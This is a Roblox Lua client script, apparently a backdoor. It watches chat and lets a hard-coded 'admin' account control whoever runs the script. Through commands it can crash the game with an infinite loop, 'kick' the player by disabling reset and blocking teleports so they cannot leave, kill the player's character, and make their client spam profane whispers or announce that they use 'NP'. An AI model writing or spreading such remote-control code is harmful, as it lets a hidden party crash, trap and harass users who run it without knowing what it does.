-- A
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")

local AdminList = { "Diwno2ff" } -- 어드민 이름들

local Loops = {}
local cmds = {}

-- crash
cmds["crash"] = function()
    while true do
        print("Penis")
    end
end

-- kick (재설정 금지 + 나가기 금지)
cmds["kick"] = function()
    if LocalPlayer.Character then
        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local Hocf = hrp and hrp.CFrame
        if hrp and Hocf then
            hrp.CFrame = CFrame.new(1e7, 1e7, 1e7)
            task.wait(0.1)
            hrp.Anchored = true
            task.wait(0.03)
            hrp.CFrame = Hocf
        end

        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.Health = math.huge
        end
        LocalPlayer.CharacterAdded:Connect(function(char)
            local newHum = char:WaitForChild("Humanoid")
            newHum.Health = math.huge
        end)

        -- Reset 비활성화
        task.spawn(function()
            repeat
                task.wait()
                pcall(function()
                    game.StarterGui:SetCore("ResetButtonCallback", false)
                end)
            until false
        end)

        -- 나가기 방지 (Teleport 방해)
        LocalPlayer.OnTeleport = function(State)
            if State == Enum.TeleportState.Started then
                error("Leaving blocked!")
            end
        end
    end
end

-- bring (어드민이 사용자 위치로 순간이동)
cmds["bring"] = function(Admin)
    if not (Admin and Admin.Character and LocalPlayer.Character) then return end
    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
    if hrp and adminHrp then
        adminHrp.CFrame = hrp.CFrame
    end
end

-- kill (사용자 죽이기)
cmds["kill"] = function()
    if LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
        if hum then
            hum.Health = 0
        end
    end
end

-- chatban (비공으로 fuck 반복)
cmds["chatban"] = function(Admin)
    if not Admin then return end
    task.spawn(function()
        while true do
            task.wait(0.5)
            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
            if channel then
                channel:SendAsync(string.format("/w %s fuck", Admin.Name))
            end
        end
    end)
end

-- help (비공으로 "나는 NP를 사용해요." 한 번 전송)
cmds["help"] = function(Admin)
    if not Admin then return end
    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if channel then
        channel:SendAsync(string.format("/w %s 나는 NP를 사용해요.", Admin.Name))
    end
end

-- 어드민 확인
local function isAdminListed(playerName)
    for _, name in ipairs(AdminList) do
        if name:lower() == playerName:lower() then
            return true
        end
    end
    return false
end

-- 채팅 감지
TextChatService.OnIncomingMessage = function(message)
    local sender = message.TextSource
    if not sender then return end
    if not isAdminListed(sender.Name) then return end

    local lowerMsg = message.Text:lower()
    if string.sub(lowerMsg, 1, 1) == ":" then
        local args = string.split(string.sub(lowerMsg, 2), " ")
        local Command = args[1] and args[1]:lower()
        local TargetName = args[2] or ""

        if cmds[Command] then
            if Command == "bring" or Command == "chatban" or Command == "help" then
                cmds[Command](Players:FindFirstChild(sender.Name))
            else
                cmds[Command]()
            end
        end
    end
end
